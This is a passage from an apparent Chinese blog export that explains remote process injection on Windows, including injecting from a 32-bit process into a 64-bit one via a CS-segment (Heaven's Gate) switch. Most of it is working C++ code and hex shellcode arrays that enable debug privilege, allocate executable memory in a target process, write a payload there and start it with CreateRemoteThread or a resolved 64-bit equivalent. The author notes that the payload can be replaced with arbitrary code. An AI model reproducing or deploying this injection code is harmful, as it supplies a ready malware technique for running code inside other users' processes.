eax, 0x6b                            */\n\t/* 0692 */ \"\\x66\\x89\\x44\\x24\\x38\"                             /* mov [rsp+0x38], ax                       */\n\t/* 0697 */ \"\\xb8\\x65\\x00\\x00\\x00\"                             /* mov eax, 0x65                            */\n\t/* 069C */ \"\\x66\\x89\\x44\\x24\\x3a\"                             /* mov [rsp+0x3a], ax                       */\n\t/* 06A1 */ \"\\xb8\\x72\\x00\\x00\\x00\"                             /* mov eax, 0x72                            */\n\t/* 06A6 */ \"\\x66\\x89\\x44\\x24\\x3c\"                             /* mov [rsp+0x3c], ax                       */\n\t/* 06AB */ \"\\xb8\\x6e\\x00\\x00\\x00\"                             /* mov eax, 0x6e                            */\n\t/* 06B0 */ \"\\x66\\x89\\x44\\x24\\x3e\"                             /* mov [rsp+0x3e], ax                       */\n\t/* 06B5 */ \"\\xb8\\x65\\x00\\x00\\x00\"                             /* mov eax, 0x65                            */\n\t/* 06BA */ \"\\x66\\x89\\x44\\x24\\x40\"                             /* mov [rsp+0x40], ax                       */\n\t/* 06BF */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 06C4 */ \"\\x66\\x89\\x44\\x24\\x42\"                             /* mov [rsp+0x42], ax                       */\n\t/* 06C9 */ \"\\xb8\\x33\\x00\\x00\\x00\"                             /* mov eax, 0x33                            */\n\t/* 06CE */ \"\\x66\\x89\\x44\\x24\\x44\"                             /* mov [rsp+0x44], ax                       */\n\t/* 06D3 */ \"\\xb8\\x32\\x00\\x00\\x00\"                             /* mov eax, 0x32                            */\n\t/* 06D8 */ \"\\x66\\x89\\x44\\x24\\x46\"                             /* mov [rsp+0x46], ax                       */\n\t/* 06DD */ \"\\xb8\\x2e\\x00\\x00\\x00\"                             /* mov eax, 0x2e                            */\n\t/* 06E2 */ \"\\x66\\x89\\x44\\x24\\x48\"                             /* mov [rsp+0x48], ax                       */\n\t/* 06E7 */ \"\\xb8\\x64\\x00\\x00\\x00\"                             /* mov eax, 0x64                            */\n\t/* 06EC */ \"\\x66\\x89\\x44\\x24\\x4a\"                             /* mov [rsp+0x4a], ax                       */\n\t/* 06F1 */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 06F6 */ \"\\x66\\x89\\x44\\x24\\x4c\"                             /* mov [rsp+0x4c], ax                       */\n\t/* 06FB */ \"\\xb8\\x6c\\x00\\x00\\x00\"                             /* mov eax, 0x6c                            */\n\t/* 0700 */ \"\\x66\\x89\\x44\\x24\\x4e\"                             /* mov [rsp+0x4e], ax                       */\n\t/* 0705 */ \"\\x33\\xc0\"                                         /* xor eax, eax                             */\n\t/* 0707 */ \"\\x66\\x89\\x44\\x24\\x50\"                             /* mov [rsp+0x50], ax                       */\n\t/* 070C */ \"\\x48\\x8b\\x44\\x24\\x58\"                             /* mov rax, [rsp+0x58]                      */\n\t/* 0711 */ \"\\x48\\x39\\x44\\x24\\x30\"                             /* cmp [rsp+0x30], rax                      */\n\t/* 0716 */ \"\\x0f\\x84\\x8b\\x00\\x00\\x00\"                         /* jz 0x7a7                                 */\n\t/* 071C */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 0721 */ \"\\x48\\x83\\xe8\\x10\"                                 /* sub rax, 0x10                            */\n\t/* 0725 */ \"\\x48\\x89\\x44\\x24\\x28\"                             /* mov [rsp+0x28], rax                      */\n\t/* 072A */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 072F */ \"\\x0f\\xb7\\x40\\x48\"                                 /* movzx eax, word [rax+0x48]               */\n\t/* 0733 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0735 */ \"\\x74\\x5e\"                                         /* jz 0x795                                 */\n\t/* 0737 */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 073C */ \"\\x0f\\xb7\\x40\\x48\"                                 /* movzx eax, word [rax+0x48]               */\n\t/* 0740 */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 0744 */ \"\\x44\\x8b\\x44\\x24\\x20\"                             /* mov r8d, [rsp+0x20]                      */\n\t/* 0749 */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 074E */ \"\\x48\\x8b\\x50\\x50\"                                 /* mov rdx, [rax+0x50]                      */\n\t/* 0752 */ \"\\x48\\x8d\\x4c\\x24\\x70\"                             /* lea rcx, [rsp+0x70]                      */\n\t/* 0757 */ \"\\xe8\\x14\\xfe\\xff\\xff\"                             /* call 0x570                               */\n\t/* 075C */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 0760 */ \"\\x33\\xd2\"                                         /* xor edx, edx                             */\n\t/* 0762 */ \"\\xb9\\x02\\x00\\x00\\x00\"                             /* mov ecx, 0x2                             */\n\t/* 0767 */ \"\\x48\\xf7\\xf1\"                                     /* div rcx                                  */\n\t/* 076A */ \"\\x33\\xc9\"                                         /* xor ecx, ecx                             */\n\t/* 076C */ \"\\x66\\x89\\x4c\\x44\\x70\"                             /* mov [rsp+rax*2+0x70], cx                 */\n\t/* 0771 */ \"\\x48\\x8d\\x54\\x24\\x38\"                             /* lea rdx, [rsp+0x38]                      */\n\t/* 0776 */ \"\\x48\\x8d\\x4c\\x24\\x70\"                             /* lea rcx, [rsp+0x70]                      */\n\t/* 077B */ \"\\xe8\\x50\\xfc\\xff\\xff\"                             /* call 0x3d0                               */\n\t/* 0780 */ \"\\x48\\x85\\xc0\"                                     /* test rax, rax                            */\n\t/* 0783 */ \"\\x74\\x10\"                                         /* jz 0x795                                 */\n\t/* 0785 */ \"\\x48\\x8b\\x44\\x24\\x28\"                             /* mov rax, [rsp+0x28]                      */\n\t/* 078A */ \"\\x48\\x8b\\x40\\x30\"                                 /* mov rax, [rax+0x30]                      */\n\t/* 078E */ \"\\x48\\x89\\x44\\x24\\x60\"                             /* mov [rsp+0x60], rax                      */\n\t/* 0793 */ \"\\xeb\\x12\"                                         /* jmp 0x7a7                                */\n\t/* 0795 */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 079A */ \"\\x48\\x8b\\x00\"                                     /* mov rax, [rax]                           */\n\t/* 079D */ \"\\x48\\x89\\x44\\x24\\x30\"                             /* mov [rsp+0x30], rax                      */\n\t/* 07A2 */ \"\\xe9\\x65\\xff\\xff\\xff\"                             /* jmp 0x70c                                */\n\t/* 07A7 */ \"\\x48\\x8b\\x44\\x24\\x60\"                             /* mov rax, [rsp+0x60]                      */\n\t/* 07AC */ \"\\x48\\x81\\xc4\\x88\\x02\\x00\\x00\"                     /* add rsp, 0x288                           */\n\t/* 07B3 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 07B4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07B9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BD */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 07BF */ \"\\xcc\"                                             /* int3                                     */\n};\ntypedef struct _RemoteParam {\n\tchar szMsg[12];    //MessageBox函数中显示的字符提示  \n\tDWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\ntypedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,\n\tLPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,\n\tLPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,\n\tDWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);\n//定义MessageBox类型的函数指针\ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n\tRemoteParam* pRP = (RemoteParam*)lParam;\n\tPFN_MESSAGEBOX pfnMessageBox;\n\tpfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;\n\tpfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);\n\treturn 0;\n}\nbool enableDebugPriv()\n{\n\tHANDLE hToken;\n\tLUID sedebugnameValue;\n\tTOKEN_PRIVILEGES tkp;\n\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {\n\t\treturn false;\n\t}\n\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\ttkp.PrivilegeCount = 1;\n\ttkp.Privileges[0].Luid = sedebugnameValue;\n\ttkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {\n\t\tCloseHandle(hToken);\n\t\treturn false;\n\t}\n\treturn true;\n}\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tPROCESSENTRY32 pe;\n\tpe.dwSize = sizeof(PROCESSENTRY32);\n\tif (!Process32First(hSnapshot, &pe)) {\n\t\tMessageBoxA(NULL,\n\t\t\t\"The frist entry of the process list has not been copyied to the buffer\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\twhile (Process32Next(hSnapshot, &pe)) {\n\t\tif (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n\t\t\treturn OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n\t\t}\n\t}\n\treturn 0;\n}\nLPVOID init_func(char* asmcode, DWORD len)\n{\n\tLPVOID sc = NULL;\n\t// allocate write/executable memory for code\n\tsc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tif (sc != NULL) {\n\t\t// copy code\n\t\tmemcpy(sc, asmcode, len);\n\t}\n\telse {\n\t\tMessageBoxA(NULL, \"VirtualAlloc()\", \"Notice\", MB_ICONINFORMATION | MB_OK);\n\t}\n\treturn sc;\n}\nint main()\n{\n\tconst DWORD dwThreadSize = 4096;\n\tDWORD dwWriteBytes = 0;\n\tenableDebugPriv();\n\tHANDLE TargetProc = GetProcessHandleByName(L\"CCC.exe\");//进程名称\n\tif (!TargetProc)\n\t{\n\t\tMessageBoxA(NULL,\n\t\t\t\"Open target process failed !\",\n\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\treturn 0;\n\t}\n\n\tBOOL ISWow64 = false;\n\tIsWow64Process(TargetProc, &ISWow64);\n\n\tif (ISWow64)\n\t{\n\t\tcout << \"32Bit Process \" <<endl;\n\t\t//在宿主进程中为线程体开辟一块存储区域  \n\t\t//在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n\t\t//其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n\t\tvoid* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n\t\t\tdwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\tif (!pRemoteThread) {\n\t\t\tMessageBoxA(NULL, \"Alloc memory in target process failed !\",\n\t\t\t\t\"notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\n\t\t//将线程体拷贝到宿主进程中  \n\t\tif (!WriteProcessMemory(TargetProc,\n\t\t\tpRemoteThread, &threadProc, dwThreadSize, 0)) {\n\t\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tcout << \"pRemoteThread:\" << hex << pRemoteThread << endl;\n\t\tgetchar();\n\t\t//定义线程参数结构体变量  \n\t\tRemoteParam remoteData;\n\t\tZeroMemory(&remoteData, sizeof(RemoteParam));\n\n\t\t//填充结构体变量中的成员  \n\t\tHINSTANCE hUser32 = LoadLibrary(L\"User32.dll\");\n\t\tremoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, \"MessageBoxA\");\n\t\tstrcat_s(remoteData.szMsg, \"Hello＼0\");\n\n\t\t//为线程参数在宿主进程中开辟存储区域  \n\t\tRemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n\t\t\tTargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n\t\tif (!pRemoteParam) {\n\t\t\tMessageBoxA(NULL, \"Alloc memory failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\t//将线程参数拷贝到宿主进程地址空间中  \n\t\tif (!WriteProcessMemory(TargetProc,\n\t\t\tpRemoteParam, &remoteData, sizeof(remoteData), 0)) {\n\t\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\n\t\t//在宿主进程中创建线程  \n\t\tHANDLE hRemoteThread = CreateRemoteThread(\n\t\t\tTargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n\t\t\tpRemoteParam, 0, &dwWriteBytes);\n\t\tif (!hRemoteThread) {\n\t\t\tMessageBoxA(NULL, \"Create remote thread failed !\", \"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tCloseHandle(hRemoteThread);\n\t\tFreeLibrary(hUser32);\n\t\treturn 0;\n\n\t}\n\telse\n\t{\n\n\t\tcout << \"64Bit Process \" << endl;\n\t\tvoid* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n\t\t\tEXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\tif (!pRemoteThread) {\n\t\t\tMessageBoxA(NULL, \"Alloc memory in target process failed !\",\n\t\t\t\t\"notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tif (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))\n\t\t{\n\t\t\tMessageBoxA(NULL, \"Write data to target process failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tHANDLE hThread = NULL;\n\t\tpCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);\n\t\tCreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &hThread);\n\t\tif (!hThread)\n\t\t{\n\t\t\tMessageBoxA(NULL, \"CreateRemoteThread64 target thread failed !\",\n\t\t\t\t\"Notice\", MB_ICONINFORMATION | MB_OK);\n\t\t\treturn 0;\n\t\t}\n\t\tWaitForSingleObject(hThread, INFINITE);\n\t}\n\treturn 0;\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n","slug":"32位程序对64位进程的远程注入实现","published":1,"date":"2020-03-18T01:56:51.259Z","updated":"2020-03-18T02:08:11.799Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63m002jccuqms1icubs","content":"<h2 id=\"远进程注入\"><a href=\"#远进程注入\" class=\"headerlink\" title=\"远进程注入\"></a>远进程注入</h2><p><a href=\"https://www.cnblogs.com/uAreKongqi/p/6012353.html\" target=\"_blank\" rel=\"noopener\">注入参考——必看</a></p>\n<h3 id=\"32位-gt-32位\"><a href=\"#32位-gt-32位\" class=\"headerlink\" title=\"32位-&gt;32位\"></a>32位-&gt;32位</h3><p>核心思路如下</p>\n<ul>\n<li>根据进程ID打开进程，获得进程句柄</li>\n<li>申请内存空间</li>\n<li>写入数据</li>\n<li>将内存改为可读可执行(可选)</li>\n<li>创建线程</li>\n<li>等待线程退出(可选)</li>\n</ul>\n<p><strong>使用到的API</strong></p>\n<ul>\n<li>OpenProcess</li>\n<li>VirtualAllocEx</li>\n<li>WriteProcessMemory</li>\n<li>VirtualProtectEx</li>\n<li>CreateRemoteThread</li>\n<li>WaitForSingleObject</li>\n</ul>\n<p>注入模板网上都有。这里贴一下注入函数且带有参数的写法</p>\n<pre><code class=\"c++\">#pragma once  \n#include &lt;windows.h&gt;  \n#include &lt;TlHelp32.h&gt;  \n#include &quot;stdio.h&quot;\n\ntypedef struct _RemoteParam {\n    char szMsg[12];    //MessageBox函数中显示的字符提示  \n    DWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\n\n//定义MessageBox类型的函数指针  \ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n    RemoteParam* pRP = (RemoteParam*)lParam;\n    PFN_MESSAGEBOX pfnMessageBox;\n    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;\n    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);\n    return 0;\n}\n\nbool enableDebugPriv()\n{\n    HANDLE hToken;\n    LUID sedebugnameValue;\n    TOKEN_PRIVILEGES tkp;\n    if (!OpenProcessToken(GetCurrentProcess(),\n        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {\n        return false;\n    }\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    tkp.PrivilegeCount = 1;\n    tkp.Privileges[0].Luid = sedebugnameValue;\n    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    return true;\n}\n\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(PROCESSENTRY32);\n    if (!Process32First(hSnapshot, &amp;pe)) {\n        MessageBoxA(NULL,\n            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    while (Process32Next(hSnapshot, &amp;pe)) {\n        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n        }\n    }\n    return 0;\n}\n\nint _main()\n{\n    const DWORD dwThreadSize = 4096;\n    DWORD dwWriteBytes = 0;\n    enableDebugPriv();\n    HANDLE TargetProc = GetProcessHandleByName(L&quot;CheckVm.exe&quot;);\n    if (!TargetProc)\n    {\n        MessageBoxA(NULL,\n            &quot;Open target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    //在宿主进程中为线程体开辟一块存储区域  \n    //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n    //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n    void* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n        dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (!pRemoteThread) {\n        MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,\n            &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    //将线程体拷贝到宿主进程中  \n    if (!WriteProcessMemory(TargetProc,\n        pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {\n        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    //定义线程参数结构体变量  \n    RemoteParam remoteData;\n    ZeroMemory(&amp;remoteData, sizeof(RemoteParam));\n\n    //填充结构体变量中的成员  \n    HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);\n    remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);\n    strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);\n\n    //为线程参数在宿主进程中开辟存储区域  \n    RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n        TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n    if (!pRemoteParam) {\n        MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    //将线程参数拷贝到宿主进程地址空间中  \n    if (!WriteProcessMemory(TargetProc,\n        pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {\n        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    //在宿主进程中创建线程  \n    HANDLE hRemoteThread = CreateRemoteThread(\n        TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n        pRemoteParam, 0, &amp;dwWriteBytes);\n    if (!hRemoteThread) {\n        MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    CloseHandle(hRemoteThread);\n    FreeLibrary(hUser32);\n    return 0;\n}</code></pre>\n<h3 id=\"32位-gt-64位\"><a href=\"#32位-gt-64位\" class=\"headerlink\" title=\"32位-&gt;64位\"></a>32位-&gt;64位</h3><p>核心思路如下</p>\n<ul>\n<li>根据进程ID打开进程，获得进程句柄</li>\n<li>申请内存空间</li>\n<li>写入数据</li>\n<li>将内存改为可读可执行(可选)</li>\n<li>创建线程</li>\n<li>等待线程退出(可选)</li>\n</ul>\n<p><strong>使用到的API</strong></p>\n<ul>\n<li>OpenProcess</li>\n<li>VirtualAllocEx</li>\n<li>WriteProcessMemory</li>\n<li>VirtualProtectEx</li>\n<li><strong>CreateRemoteThread64</strong></li>\n<li>WaitForSingleObject</li>\n</ul>\n<p>32位去注入64位进程时<code>CreateRemoteThread</code>会调用失败，需要使用64位的接口</p>\n<p>先提升到64位汇编，在遍历ntdll.dll中的导出函数 <code>CreateRemoteThread</code></p>\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2><p><a href=\"https://www.cnblogs.com/HsinTsao/p/7270732.html\" target=\"_blank\" rel=\"noopener\">32位注入64位参考</a></p>\n<p>3g大佬代码代码有点问题，有点误导</p>\n<p>获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的</p>\n<blockquote>\n<p> 在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，<strong>CS = 0x23</strong>；64位模式时，<strong>CS = 0x33</strong>。</p>\n<p>这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令</p>\n<p><code>pop ip</code></p>\n<p><code>pop cs</code></p>\n</blockquote>\n<p>代码中<code>CREATETHREADPIC</code>shellcode是用来得到64位的<code>CreateRemoteThread</code></p>\n<p><code>EXECPIC</code>是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码</p>\n<pre><code class=\"c++\">#pragma once  \n#include &lt;windows.h&gt;  \n#include &lt;TlHelp32.h&gt;  \n#include &lt;iostream&gt;\nusing namespace std;\n\n#define CREATETHREADPIC_SIZE 271\nchar CREATETHREADPIC[] = {\n    /* 0000 */ &quot;\\x53&quot;                             /* push ebx                    */\n    /* 0001 */ &quot;\\x56&quot;                             /* push esi                    */\n    /* 0002 */ &quot;\\x57&quot;                             /* push edi                    */\n    /* 0003 */ &quot;\\x55&quot;                             /* push ebp                    */\n    /* 0004 */ &quot;\\xe8\\x6c\\x00\\x00\\x00&quot;             /* call 0x75                   */\n    /* 0009 */ &quot;\\x85\\xc0&quot;                         /* test eax, eax               */\n    /* 000B */ &quot;\\x74\\x5d&quot;                         /* jz 0x6a                     */\n    /* 000D */ &quot;\\x48\\x89\\xe6&quot;                     /* mov rsi, rsp                */\n    /* 0010 */ &quot;\\x48\\x83\\xe4\\xf0&quot;                 /* and rsp, 0xfffffffffffffff0 */\n    /* 0014 */ &quot;\\x48\\x83\\xec\\x68&quot;                 /* sub rsp, 0x68               */\n    /* 0018 */ &quot;\\xb8\\xfa\\x80\\x39\\x5e&quot;             /* mov eax, 0x5e3980fa         */\n    /* 001D */ &quot;\\xe8\\x78\\x00\\x00\\x00&quot;             /* call 0x9a                   */\n    /* 0022 */ &quot;\\x48\\x89\\xc3&quot;                     /* mov rbx, rax                */\n    /* 0025 */ &quot;\\x4d\\x31\\xc0&quot;                     /* xor r8, r8                  */\n    /* 0028 */ &quot;\\x48\\x31\\xc0&quot;                     /* xor rax, rax                */\n    /* 002B */ &quot;\\x48\\x89\\x44\\x24\\x50&quot;             /* mov [rsp+0x50], rax         */\n    /* 0030 */ &quot;\\x48\\x89\\x44\\x24\\x48&quot;             /* mov [rsp+0x48], rax         */\n    /* 0035 */ &quot;\\x48\\x89\\x44\\x24\\x40&quot;             /* mov [rsp+0x40], rax         */\n    /* 003A */ &quot;\\x48\\x89\\x44\\x24\\x38&quot;             /* mov [rsp+0x38], rax         */\n    /* 003F */ &quot;\\x48\\x89\\x44\\x24\\x30&quot;             /* mov [rsp+0x30], rax         */\n    /* 0044 */ &quot;\\x8b\\x46\\x24&quot;                     /* mov eax, [rsi+0x24]         */\n    /* 0047 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot;             /* mov [rsp+0x28], rax         */\n    /* 004C */ &quot;\\x8b\\x46\\x20&quot;                     /* mov eax, [rsi+0x20]         */\n    /* 004F */ &quot;\\x48\\x89\\x44\\x24\\x20&quot;             /* mov [rsp+0x20], rax         */\n    /* 0054 */ &quot;\\x44\\x8b\\x4e\\x14&quot;                 /* mov r9d, [rsi+0x14]         */\n    /* 0058 */ &quot;\\xba\\x00\\x00\\x00\\x10&quot;             /* mov edx, 0x10000000         */\n    /* 005D */ &quot;\\x8b\\x4e\\x30&quot;                     /* mov ecx, [rsi+0x30]         */\n    /* 0060 */ &quot;\\xff\\xd3&quot;                         /* call rbx                    */\n    /* 0062 */ &quot;\\x48\\x89\\xf4&quot;                     /* mov rsp, rsi                */\n    /* 0065 */ &quot;\\xe8\\x18\\x00\\x00\\x00&quot;             /* call 0x82                   */\n    /* 006A */ &quot;\\x5d&quot;                             /* pop rbp                     */\n    /* 006B */ &quot;\\x5f&quot;                             /* pop rdi                     */\n    /* 006C */ &quot;\\x5e&quot;                             /* pop rsi                     */\n    /* 006D */ &quot;\\x5b&quot;                             /* pop rbx                     */\n    /* 006E */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 006F */ &quot;\\x31\\xc0&quot;                         /* xor eax, eax                */\n    /* 0071 */ &quot;\\x48\\xf7\\xd8&quot;                     /* neg eax                     */\n    /* 0074 */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 0075 */ &quot;\\xe8\\xf5\\xff\\xff\\xff&quot;             /* call 0x6f                   */\n    /* 007A */ &quot;\\x74\\x05&quot;                         /* jz 0x81                     */\n    /* 007C */ &quot;\\x58&quot;                             /* pop eax                     */\n    /* 007D */ &quot;\\x6a\\x33&quot;                         /* push 0x33                   */ //将cs修改为0x33\n    /* 007F */ &quot;\\x50&quot;                             /* push eax                    */ //也就能执行64位汇编了\n    /* 0080 */ &quot;\\xcb&quot;                             /* retf                        */\n    /* 0081 */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 0082 */ &quot;\\xe8\\xe8\\xff\\xff\\xff&quot;             /* call 0x6f                   */\n    /* 0087 */ &quot;\\x75\\x10&quot;                         /* jnz 0x99                    */\n    /* 0089 */ &quot;\\x58&quot;                             /* pop rax                     */\n    /* 008A */ &quot;\\x83\\xec\\x08&quot;                     /* sub esp, 0x8                */\n    /* 008D */ &quot;\\x89\\x04\\x24&quot;                     /* mov [rsp], eax              */\n    /* 0090 */ &quot;\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00&quot; /* mov dword [rsp+0x4], 0x23   */\n    /* 0098 */ &quot;\\xcb&quot;                             /* retf                        */\n    /* 0099 */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 009A */ &quot;\\x56&quot;                             /* push rsi                    */\n    /* 009B */ &quot;\\x57&quot;                             /* push rdi                    */\n    /* 009C */ &quot;\\x53&quot;                             /* push rbx                    */\n    /* 009D */ &quot;\\x51&quot;                             /* push rcx                    */\n    /* 009E */ &quot;\\x49\\x89\\xc0&quot;                     /* mov r8, rax                 */\n    /* 00A1 */ &quot;\\x6a\\x60&quot;                         /* push 0x60                   */\n    /* 00A3 */ &quot;\\x5e&quot;                             /* pop rsi                     */\n    /* 00A4 */ &quot;\\x65\\x48\\x8b\\x06&quot;                 /* mov rax, [gs:rsi]           */\n    /* 00A8 */ &quot;\\x48\\x8b\\x40\\x18&quot;                 /* mov 